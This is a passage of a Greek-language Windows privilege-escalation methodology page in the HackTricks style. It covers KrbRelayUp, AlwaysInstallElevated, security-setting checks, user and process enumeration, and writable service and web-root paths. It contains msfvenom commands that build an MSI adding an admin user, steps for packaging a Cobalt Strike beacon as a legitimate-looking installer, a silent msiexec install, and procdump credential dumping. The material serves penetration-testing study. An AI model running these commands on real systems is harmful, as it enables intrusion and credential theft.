Ελέγξτε την πραγματική πολιτική του DC για [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) και [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), το ACL του αντικειμένου για την ταυτότητα που γίνεται relay, καθώς και τα επίπεδα authentication και impersonation της επιλεγμένης κλάσης COM. Ο τύπος σύνδεσης του χρήστη και το πλαίσιο διαπιστευτηρίων έχουν σημασία: μια συνεδρία WinRM μπορεί να συμπεριφέρεται διαφορετικά από μια διαδραστική σύνδεση ή μια σύνδεση με νέα διαπιστευτήρια. Η δρομολόγηση μέσω firewall/OXID και οι εγκατεστημένες ενημερώσεις μπορούν επίσης να αλλάξουν το αποτέλεσμα. Αντιμετωπίστε μια επιτρεπτική πολιτική ή ένα ACL με τα κατάλληλα δικαιώματα ως υποψήφια για έλεγχο· η παθητική απαρίθμηση δεν πρέπει να προκαλεί COM coercion, relay authentication ή εγγραφές στον κατάλογο. Ένα shadow credential λογαριασμού υπολογιστή μπορεί να οδηγήσει σε machine ticket και, μόνο αν αυτός ο λογαριασμός έχει τα απαιτούμενα δικαιώματα αναπαραγωγής καταλόγου, σε ξεχωριστή διαδρομή DCSync.

Βρείτε το **exploit στο** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης, δείτε [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Αν** αυτά τα 2 κλειδιά μητρώου είναι **ενεργοποιημένα** (τιμή **0x1**), τότε χρήστες με οποιοδήποτε επίπεδο προνομίων μπορούν να **εγκαταστήσουν** (εκτελέσουν) αρχεία `*.msi` ως NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Αν έχετε μια meterpreter session, μπορείτε να αυτοματοποιήσετε αυτήν την τεχνική χρησιμοποιώντας το module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` από το power-up για να δημιουργήσετε στον τρέχοντα κατάλογο ένα Windows MSI binary για κλιμάκωση προνομίων. Αυτό το script δημιουργεί ένα προμεταγλωττισμένο MSI installer που ζητά την προσθήκη χρήστη/ομάδας (οπότε θα χρειαστείτε πρόσβαση GIU):

```
Write-UserAddMSI
```

Απλώς εκτελέστε το binary που δημιουργήθηκε για να κλιμακώσετε τα προνόμια.

### MSI Wrapper

Διαβάστε αυτό το tutorial για να μάθετε πώς να δημιουργήσετε ένα MSI wrapper χρησιμοποιώντας αυτά τα tools. Σημειώστε ότι μπορείτε να κάνετε wrap ένα αρχείο "**.bat**" αν θέλετε **απλώς** να **εκτελέσετε** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Δημιουργήστε** με το Cobalt Strike ή το Metasploit ένα **νέο Windows EXE TCP payload** στη διαδρομή `C:\privesc\beacon.exe`
- Ανοίξτε το **Visual Studio**, επιλέξτε **Create a new project** και πληκτρολογήστε "installer" στο πλαίσιο αναζήτησης. Επιλέξτε το project **Setup Wizard** και κάντε κλικ στο **Next**.
- Δώστε ένα όνομα στο project, όπως **AlwaysPrivesc**, χρησιμοποιήστε τη διαδρομή **`C:\privesc`** για την τοποθεσία, επιλέξτε **place solution and project in the same directory** και κάντε κλικ στο **Create**.
- Κάντε κλικ στο **Next** μέχρι να φτάσετε στο βήμα 3 από τα 4 (επιλογή των αρχείων που θα συμπεριληφθούν). Κάντε κλικ στο **Add** και επιλέξτε το Beacon payload που μόλις δημιουργήσατε. Στη συνέχεια, κάντε κλικ στο **Finish**.
- Επισημάνετε το project **AlwaysPrivesc** στο **Solution Explorer** και στις **Properties**, αλλάξτε το **TargetPlatform** από **x86** σε **x64**.
  - Υπάρχουν κι άλλες ιδιότητες που μπορείτε να αλλάξετε, όπως τα **Author** και **Manufacturer**, ώστε η εγκατεστημένη εφαρμογή να φαίνεται πιο νόμιμη.
- Κάντε δεξί κλικ στο project και επιλέξτε **View > Custom Actions**.
- Κάντε δεξί κλικ στο **Install** και επιλέξτε **Add Custom Action**.
- Κάντε διπλό κλικ στο **Application Folder**, επιλέξτε το αρχείο **beacon.exe** και κάντε κλικ στο **OK**. Έτσι διασφαλίζεται ότι το beacon payload θα εκτελεστεί μόλις εκτελεστεί το installer.
- Στις **Custom Action Properties**, αλλάξτε το **Run64Bit** σε **True**.
- Τέλος, **κάντε build**.
  - Αν εμφανιστεί η προειδοποίηση `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, βεβαιωθείτε ότι έχετε ορίσει την πλατφόρμα σε x64.

### MSI Installation

Για να εκτελέσετε την **εγκατάσταση** του κακόβουλου αρχείου `.msi` στο **παρασκήνιο:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Για να κάνετε exploit σε αυτήν την ευπάθεια, μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always_install_elevated_

## Antivirus και ανιχνευτές

### Ρυθμίσεις ελέγχου

Αυτές οι ρυθμίσεις καθορίζουν τι **καταγράφεται**, γι' αυτό πρέπει να τους δώσετε προσοχή

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Το Windows Event Forwarding· έχει ενδιαφέρον να γνωρίζουμε πού αποστέλλονται τα logs.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

Το **LAPS** έχει σχεδιαστεί για τη **διαχείριση των κωδικών πρόσβασης τοπικού Administrator**, διασφαλίζοντας ότι κάθε κωδικός πρόσβασης είναι **μοναδικός, τυχαίος και ενημερώνεται τακτικά** στους υπολογιστές που είναι συνδεδεμένοι σε domain. Αυτοί οι κωδικοί πρόσβασης αποθηκεύονται με ασφάλεια στο Active Directory και είναι προσβάσιμοι μόνο από χρήστες στους οποίους έχουν εκχωρηθεί επαρκή δικαιώματα μέσω ACLs, ώστε να μπορούν να βλέπουν τους κωδικούς πρόσβασης του τοπικού admin, εφόσον έχουν εξουσιοδότηση.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Αν είναι ενεργό, οι **κωδικοί πρόσβασης αποθηκεύονται σε μορφή απλού κειμένου στο LSASS** (Local Security Authority Subsystem Service).\
[**Περισσότερες πληροφορίες για το WDigest σε αυτή τη σελίδα**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Ξεκινώντας με τα **Windows 8.1**, η Microsoft εισήγαγε ενισχυμένη προστασία για την Τοπική Αρχή Ασφαλείας (LSA), ώστε να **αποκλείει** προσπάθειες μη έμπιστων διεργασιών να **διαβάσουν τη μνήμη της** ή να εισαγάγουν κώδικα, ενισχύοντας περαιτέρω την ασφάλεια του συστήματος.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

Το **Credential Guard** εισήχθη στα **Windows 10**. Σκοπός του είναι να προστατεύει τα διαπιστευτήρια που είναι αποθηκευμένα σε μια συσκευή από απειλές όπως οι επιθέσεις pass-the-hash. [**Περισσότερες πληροφορίες για το Credential Guard είναι διαθέσιμες εδώ.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Αποθηκευμένα διαπιστευτήρια

Τα **διαπιστευτήρια τομέα** πιστοποιούνται από την **Τοπική Αρχή Ασφαλείας** (LSA) και χρησιμοποιούνται από στοιχεία του λειτουργικού συστήματος. Όταν τα δεδομένα σύνδεσης ενός χρήστη πιστοποιούνται από ένα καταχωρισμένο πακέτο ασφαλείας, συνήθως δημιουργούνται διαπιστευτήρια τομέα για τον χρήστη.\
[**Περισσότερες πληροφορίες για τα αποθηκευμένα διαπιστευτήρια εδώ**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Χρήστες και Ομάδες

### Απαρίθμηση Χρηστών και Ομάδων

Θα πρέπει να ελέγξεις αν κάποια από τις ομάδες στις οποίες ανήκεις έχει ενδιαφέροντα δικαιώματα

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Προνομιούχες ομάδες

Αν **ανήκετε σε κάποια προνομιούχο ομάδα, ίσως μπορέσετε να κλιμακώσετε τα προνόμιά σας**. Μάθετε εδώ για τις προνομιούχες ομάδες και πώς να τις εκμεταλλευτείτε για να κλιμακώσετε τα προνόμιά σας:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Χειρισμός token

**Μάθετε περισσότερα** για το τι είναι ένα **token** σε αυτήν τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Δείτε την παρακάτω σελίδα για να **μάθετε περισσότερα σχετικά με ενδιαφέροντα token** και πώς να τα εκμεταλλευτείτε:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Συνδεδεμένοι χρήστες / Sessions

```bash
qwinsta
klist sessions
```

### Φάκελοι χρηστών

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Πολιτική κωδικών πρόσβασης

```bash
net accounts
```

### Λήψη του περιεχομένου του προχείρου

```bash
powershell -command "Get-Clipboard"
```

## Εκτελούμενες διεργασίες

### Δικαιώματα αρχείων και φακέλων

Πρώτα απ’ όλα, κατά την απαρίθμηση των διεργασιών **ελέγξτε αν υπάρχουν κωδικοί πρόσβασης στη γραμμή εντολών της διεργασίας**.\
Ελέγξτε αν μπορείτε να **αντικαταστήσετε κάποιο binary που εκτελείται** ή αν έχετε δικαιώματα εγγραφής στον φάκελο του binary, ώστε να εκμεταλλευτείτε πιθανές [**επιθέσεις DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Να ελέγχετε πάντα για πιθανούς [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) που εκτελούνται· θα μπορούσατε να τους εκμεταλλευτείτε για κλιμάκωση προνομίων.

Ένας debugger listener μπορεί να είναι βραχύβιος, επομένως η απουσία του από ένα παθητικό στιγμιότυπο θυρών δεν αποδεικνύει ότι δεν ήταν ποτέ εκτεθειμένος. Συσχετίστε κάθε listener που παρατηρείτε με το PID του, τον κάτοχο της διεργασίας και τη δυνατότητα πρόσβασης του χρήστη με λιγότερα προνόμια σε αυτόν· το όνομα μιας εφαρμογής ή μια debug flag από μόνα τους δεν τεκμηριώνουν εκτέλεση κώδικα μεταξύ χρηστών. Φροντίστε η συνήθης απαρίθμηση να παραμένει παθητική, χωρίς αποστολή debugger commands.

**Έλεγχος δικαιωμάτων των binaries των διεργασιών**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Έλεγχος δικαιωμάτων στους φακέλους των binaries των διεργασιών (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Κατάλογοι dynamic preprocessor του Snort

Το Snort 2 μπορεί να φορτώνει shared libraries από έναν `dynamicpreprocessor directory` που δηλώνεται στο configuration που επιλέγεται με `snort.exe -c <config>`. Για scheduled task ή service που εκτελεί το Snort με διαφορετικό account, ελέγξτε το συγκεκριμένο configuration και τα ACL του δηλωμένου καταλόγου modules. Αν το token σας μπορεί να δημιουργεί αρχεία εκεί, η διαδρομή αξίζει να εξεταστεί ως πιθανό σημείο για code execution την επόμενη φορά που το task ή το service θα φορτώσει modules. Επαληθεύστε τα πραγματικά privileges του account που εκτελεί την εργασία, το ενεργό configuration, τη συμβατότητα των modules και τυχόν περιορισμούς deny ή share· ένας εγγράψιμος κατάλογος από μόνος του δεν αποδεικνύει escalation. Η [τεκμηρίωση του Snort για το dynamic-preprocessor](https://www.snort.org/documents/dpx-readme) περιγράφει τη φόρτωση modules κατά το runtime.

### Privileged web service με εγγράψιμο document root

Σε εγκατάσταση Apache στα Windows, συγκρίνετε τη διαδρομή του executable του service και το account εκτέλεσής του με το `DocumentRoot` του ενεργού `httpd.conf`. Για μια τυπική διάταξη XAMPP, ελέγξτε το `C:\xampp\apache\conf\httpd.conf` και τα ACL του ρυθμισμένου document root, που συχνά είναι το `C:\xampp\htdocs`. Αν ένας χρήστης με χαμηλότερα privileges μπορεί να δημιουργεί αρχεία σε αυτό το root ενώ το Apache εκτελείται ως `LocalSystem`, η εκτέλεση κώδικα στην πλευρά του server ενδέχεται να υπερβεί το όριο privileges του host. Επιβεβαιώστε ότι το service εκτελείται, ότι εξυπηρετείται η ακριβής διαδρομή και ότι ένας handler στην πλευρά του server επεξεργάζεται τον τύπο αρχείου· ένα εγγράψιμο root από μόνο του αποδεικνύει μόνο τη δυνατότητα δημιουργίας αρχείων. Ελέγξτε τα ACL χωρίς να γράψετε probe:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Για μια συμβατική εγκατάσταση WAMP, η υπηρεσία μπορεί να δείχνει σε ένα versioned `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (ή σε `C:\wamp\...` για διάταξη 32-bit), με τη διαμόρφωση δίπλα του, στο `conf\httpd.conf`, και προεπιλεγμένο root `C:\wamp64\www` ή `C:\wamp\www`. Ελέγξτε μαζί την ακριβή εικόνα υπηρεσίας, την ταυτότητα εκτέλεσής της, το ενεργό `DocumentRoot` (συμπεριλαμβανομένης της ανάπτυξης του `${INSTALL_DIR}` και των παρακάμψεων των virtual host) και τα ACL του root. Ένας εγγράψιμος κατάλογος WAMP δεν αποδεικνύει ότι το Apache εκτελείται ως `SYSTEM` ή ότι εκτελεί το υποβληθέν αρχείο. [Το Apache τεκμηριώνει πώς μια υπηρεσία Windows επιλέγει τη διαμόρφωσή της](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Εγγράψιμο root IIS και ταυτότητα δικτύου του application pool

Για το IIS, αντιστοιχίστε έναν εγγράψιμο φυσικό κατάλογο σε έναν **ενεργό site/application** στο `applicationHost.config` και, στη συνέχεια, εντοπίστε το διαμορφωμένο pool και τον server-side handler. Ο κώδικας που τοποθετείται σε έναν κατάλογο που εξυπηρετείται εκτελείται ως το pool μόνο εάν το IIS επεξεργάζεται αυτόν τον τύπο αρχείου και η διαδρομή είναι προσβάσιμη. Ελέγξτε τα πραγματικά δικαιώματα του τρέχοντος χρήστη για δημιουργία αρχείων, την κατάσταση εκτέλεσης του site, τον handler και τις παρακάμψεις ανά διαδρομή, πριν θεωρήσετε ότι ένας εγγράψιμος κατάλογος επιτρέπει εκτέλεση κώδικα.

Η δυναμική μεταγλώττιση ASP.NET εισάγει μια ξεχωριστή διαδρομή προς εξέταση: τα αρχεία που δημιουργούνται στον κατάλογο μεταγλώττισης της εφαρμογής. Η προεπιλογή είναι ένας κατάλογος `Temporary ASP.NET Files` κάτω από τη σχετική εγκατάσταση του .NET Framework, αλλά το `<compilation tempDirectory>` της εφαρμογής μπορεί να τον αλλάξει. [Η Microsoft τεκμηριώνει τη θέση και τους υποκαταλόγους ανά εφαρμογή](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) και [συνιστά την απομόνωση των καταλόγων μεταγλώττισης όταν τα application pool δεν εμπιστεύονται το ένα το άλλο](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Αν ένα token με χαμηλότερα προνόμια μπορεί να τροποποιήσει τον παραγόμενο πηγαίο κώδικα στην **συγκεκριμένη** cache της εφαρμογής, εξακριβώστε αν η εφαρμογή θα τον μεταγλωττίσει ξανά υπό μια πιο προνομιούχα [ταυτότητα worker process](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Ένα ACL αρχείου ή καταλόγου από μόνο του δεν αποδεικνύει εκτέλεση κώδικα: συσχετίστε την cache με την ενεργή εφαρμογή, το ενεργό token και ACL, τις ρυθμίσεις μεταγλώττισης, την ταυτότητα της διεργασίας και τον χρονισμό τυχόν επαναμεταγλώττισης. Χρησιμοποιήστε μόνο έλεγχο μεταδεδομένων για ανάγνωση· μην προκαλείτε μεταγλώττιση και μην τροποποιείτε αρχεία cache κατά την απαρίθμηση.

Ένα IIS pool διαμορφωμένο ως `ApplicationPoolIdentity` ή `NetworkService` συνήθως πιστοποιείται σε πόρους τομέα ως **λογαριασμός υπολογιστή του host**, παρότι το τοπικό του token μπορεί να έχει χαμηλά προνόμια. Το `LocalSystem` έχει ήδη υψηλά τοπικά προνόμια και χρησιμοποιεί επίσης τον λογαριασμό υπολογιστή στο δίκτυο· το `LocalService` συνήθως χρησιμοποιεί ανώνυμα διαπιστευτήρια δικτύου. Ένα pool `SpecificUser` χρησιμοποιεί αντίθετα τον λογαριασμό που έχει διαμορφωθεί για αυτό. [Η Microsoft τεκμηριώνει αυτούς τους τύπους ταυτότητας](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) και [την ταυτότητα δικτύου του application pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Αν παραλείπεται η ρύθμιση ταυτότητας, μπορεί να κληρονομούνται οι προεπιλογές του pool, οι οποίες διαφέρουν μεταξύ γενεών IIS· επομένως, επιλύστε την ενεργή διαμόρφωση αντί να κάνετε υποθέσεις από το όνομα του pool. Αν η εκτέλεση κώδικα φτάνει σε pool με ταυτότητα δικτύου λογαριασμού υπολογιστή, αξιολογήστε τα δικαιώματα καταλόγου του **συγκεκριμένου υπολογιστή**. Η [DCSync](../active-directory-methodology/dcsync.md) απαιτεί δικαιώματα αναπαραγωγής στο naming context του domain· ένα ticket λογαριασμού μηχανήματος ή ο ρόλος του host από μόνος του δεν τα αποδεικνύει. Η παθητική απαρίθμηση πρέπει να ελέγχει τις ρυθμίσεις και τα ACL χωρίς μεταφόρτωση αρχείου, πρόκληση αυθεντικοποίησης δικτύου ή αίτημα για tickets.

Για έναν αναγνώσιμο ASP.NET handler που εκκινεί βοηθητική διεργασία, παρακολουθήστε κάθε τιμή που προέρχεται από αίτημα σε όλα τα στάδια αυθεντικοποίησης, αποκρυπτογράφησης, επικύρωσης και κατασκευής εντολής. Ένας handler που συνενώνει ένα αποκωδικοποιημένο token στο `ProcessStartInfo("cmd", "/c ...")` μπορεί να επιτρέψει σε μεταχαρακτήρες του shell να αλλάξουν την εντολή· [η Microsoft τεκμηριώνει τους ειδικούς χαρακτήρες του `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Βεβαιωθείτε ότι ένας μη έμπιστος καλών μπορεί πράγματι να επηρεάσει την αποκωδικοποιημένη τιμή και να φτάσει στον handler, και, στη συνέχεια, προσδιορίστε την ενεργή ταυτότητα του application pool ή την ταυτότητα impersonation, καθώς και την ταυτότητα της θυγατρικής διεργασίας. Μια αναγνώσιμη γραμμή πηγαίου κώδικα, ένας listener στο localhost ή μια αδυναμία στη μορφή token από μόνα τους δεν αποδεικνύουν εκτέλεση προνομιούχων εντολών. Ελέγξτε τον πηγαίο κώδικα και τη διαμόρφωση του pool χωρίς να στέλνετε πλαστογραφημένα αιτήματα ή να εκτελείτε τη βοηθητική διεργασία κατά την παθητική απαρίθμηση.

Για μια υπηρεσία PHP σε Windows, μια διαδρομή που ελέγχεται από αίτημα και περνά σε [`include` ή `require`](https://www.php.net/manual/en/function.include.php) μπορεί να εκτελέσει ένα αρχείο PHP που είναι εγγράψιμο από χρήστη χαμηλότερων προνομίων, με την ταυτότητα του worker. Επιβεβαιώστε ότι το αίτημα μπορεί να φτάσει σε αυτή την εντολή, ότι η επιλυμένη διαδρομή δείχνει σε αρχείο που μπορεί να τροποποιήσει ο χρήστης χαμηλότερων προνομίων και να διαβάσει ο worker, ότι οι σχετικοί περιορισμοί διαδρομής της PHP επιτρέπουν το include και ότι ο worker εκτελείται πράγματι με υψηλότερα προνόμια. Ένας listener στο loopback ή ένα εγγράψιμο αρχείο από μόνο του δεν αποδεικνύει αυτή την αλυσίδα· ελέγξτε τον πηγαίο κώδικα, την ταυτότητα της υπηρεσίας και τα ACL των αρχείων χωρίς να καλέσετε το endpoint κατά την παθητική απαρίθμηση.

### Εξόρυξη κωδικών πρόσβασης από τη μνήμη

Μπορείτε να δημιουργήσετε ένα memory dump μιας εκτελούμενης διεργασίας χρησιμοποιώντας το **procdump** από το sysinternals. Υπηρεσίες όπως το FTP έχουν **διαπιστευτήρια σε απλό κείμενο στη μνήμη**· δοκιμάστε να κάνετε dump της μνήμης και να διαβάσετε τα διαπιστευτήρια.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Μη ασφαλείς εφαρμογές GUI

**Οι εφαρμογές που εκτελούνται ως SYSTEM ενδέχεται να επιτρέπουν σε έναν χρήστη να εκκινήσει ένα CMD ή να περιηγηθεί σε καταλόγους.**

Παράδειγμα: «Windows Help and Support» (Windows + F1), αναζητήστε «command prompt» και κάντε κλικ στο «Click to open Command Prompt»

### Εισαγωγή αρχείων έργου με αυξημένα δικαιώματα

Μια εφαρμογή που ανοίγει αυτόματα έργα από έναν κατάλογο απόθεσης στον οποίο μπορεί να γράψει ένας χρήστης με χαμηλότερα δικαιώματα, περνά ένα όριο εμπιστοσύνης εισόδου υπό τον λογαριασμό του προγράμματος εισαγωγής. Εξετάστε την **ακριβή εγγράψιμη διαδρομή**, τη διεργασία ή την εργασία που την ανοίγει, την ταυτότητα με την οποία εκτελείται και την έκδοση του parser. Ένα [ιστορικό ζήτημα ανοίγματος/επαναφοράς έργου στο Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) επέτρεπε τη χρήση εξωτερικών οντοτήτων XML στα μεταδεδομένα έργου· μια οντότητα δικτύου στα Windows θα μπορούσε να προκαλέσει έλεγχο ταυτότητας από τον λογαριασμό εισαγωγής, εφόσον το [outbound SMB και η πολιτική NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) το επιτρέπουν. Αυτό αποτελεί ένδειξη πιθανής έκθεσης διαπιστευτηρίων, όχι άμεσης πρόσβασης διαχειριστή: η απόκριση πρέπει να μπορεί να αξιοποιηθεί μέσω ξεχωριστής εξουσιοδοτημένης ή ευάλωτης διαδρομής, ενώ οι τρέχουσες εκδόσεις πρέπει να αξιολογούνται με βάση την πραγματική κατάσταση των patches τους. Μην ανοίγετε κακόβουλα διαμορφωμένο έργο κατά την παθητική απαρίθμηση· εξετάστε τη ροή εισαγωγής και τα ACL.

## Υπηρεσίες

Το δικαίωμα [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) στο αντικείμενο Service Control Manager (SCM) είναι ξεχωριστό από τα δικαιώματα σε μια υπάρχουσα υπηρεσία. Ένα επιτυχές, μόνο για ανάγνωση αίτημα πρόσβασης [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) για αυτό το δικαίωμα αποτελεί ένδειξη προς διερεύνηση, όχι απόδειξη ότι μπορεί να εκτελεστεί μια νέα υπηρεσία. Η [`CreateService επιστρέφει ένα handle`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) με τα δικαιώματα πρόσβασης στην υπηρεσία που ζητήθηκαν κατά τη δημιουργία της· το επόμενο άνοιγμα της υπηρεσίας εκτελεί ξεχωριστό έλεγχο πρόσβασης και μπορεί να αποτύχει, ακόμη κι όταν θα μπορούσε να χρησιμοποιηθεί το αρχικό handle. Επαληθεύστε ξεχωριστά το πραγματικό τοπικό ή απομακρυσμένο token, τα δικαιώματα του handle που παραχωρήθηκαν, τον λογαριασμό υπηρεσίας, την πολιτική εκκίνησης και τη διαδρομή του εκτελέσιμου αρχείου. Μην δημιουργείτε ή εκκινείτε υπηρεσία κατά την παθητική απαρίθμηση.

Για μια απομακρυσμένη διαδρομή εγκατάστασης υπηρεσίας, συσχετίστε αυτά τα δικαιώματα SCM με ένα share στον στόχο στο οποίο μπορεί να γράψει το **ίδιο network logon**, το υποκείμενο ACL NTFS και μια τοπική διαδρομή εκτελέσιμου αρχείου που μπορεί να εκτελέσει ο λογαριασμός υπηρεσίας. Ένας λογαριασμός χωρίς δικαιώματα διαχειριστή μπορεί να περάσει αυτό το όριο, αν υπάρχουν ασυνήθιστα ευρεία δικαιώματα SCM και δυνατότητα τοποθέτησης αρχείου· δεν απαιτείται κατ’ ανάγκη administrative share. Η πρόσβαση εγγραφής σε share από μόνη της, ή η ένδειξη δυνατότητας δημιουργίας υπηρεσίας μέσω SCM από μόνη της, δεν αποδεικνύει ότι η νέα υπηρεσία μπορεί να εκκινηθεί με υψηλότερη ταυτότητα.

Μια υπάρχουσα υπηρεσία μπορεί να καλέσει ένα βοηθητικό εκτελέσιμο αρχείο κατά την εκκίνηση, τον τερματισμό ή κάποιο άλλο συμβάν του κύκλου ζωής, ακόμη κι όταν αυτό το βοηθητικό αρχείο απουσιάζει από το `ImagePath` της. Αν το όνομα του βοηθητικού αρχείου επιλύεται σε κατάλογο όπου μπορεί να γράψει χρήστης με χαμηλότερα δικαιώματα και η υπηρεσία εκτελείται με υψηλότερη ταυτότητα, ένα αρχείο βοηθήματος που λείπει μπορεί υπό προϋποθέσεις να αντικατασταθεί. Επιβεβαιώστε τον **πραγματικό κώδικα της υπηρεσίας ή την τεκμηριωμένη κλήση του βοηθητικού αρχείου**, τη διαδρομή του εκτελέσιμου αρχείου και τη σειρά αναζήτησης που επιλύονται, τα δικαιώματα δημιουργίας καταλόγου, την ταυτότητα της υπηρεσίας και την ύπαρξη κατάλληλου trigger κύκλου ζωής. Ένας εγγράψιμος κατάλογος υπηρεσίας ή ένα αρχείο που λείπει από μόνο του δεν αποδεικνύει ότι η υπηρεσία φορτώνει το αρχείο· η παθητική εξέταση δεν πρέπει να εκκινεί ή να τερματίζει την υπηρεσία.

Για μια υπάρχουσα υπηρεσία, το [`SERVICE_START επιτρέπει την παροχή ορισμάτων στο StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)· είναι διαφορετικό από το [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Εξετάστε τον κώδικα ή την τεκμηριωμένη διεπαφή της υπηρεσίας πριν θεωρήσετε ότι η πρόσβαση εκκίνησης είναι κάτι περισσότερο από δικαίωμα ελέγχου. Αν χρησιμοποιεί όρισμα που επιλέγει ο καλών ως διαδρομή log ή export, επαληθεύστε την ταυτότητα της υπηρεσίας, την ακριβή ροή από το όρισμα στην εγγραφή, τους περιορισμούς διαδρομής και τα δικαιώματα του **αρχείου που δημιουργείται**. Η εγγραφή σε προστατευμένο κατάλογο μπορεί να οδηγήσει σε κλιμάκωση μόνο αν υπάρχει ξεχωριστός προνομιούχος consumer ή loader που δέχεται αυτό το αρχείο· ένα εγγράψιμο log ή το δικαίωμα εκκίνησης από μόνο του δεν αρκεί. Η παθητική καταγραφή δεν πρέπει να εκκινεί την υπηρεσία ή να δημιουργεί δοκιμαστικό αρχείο.

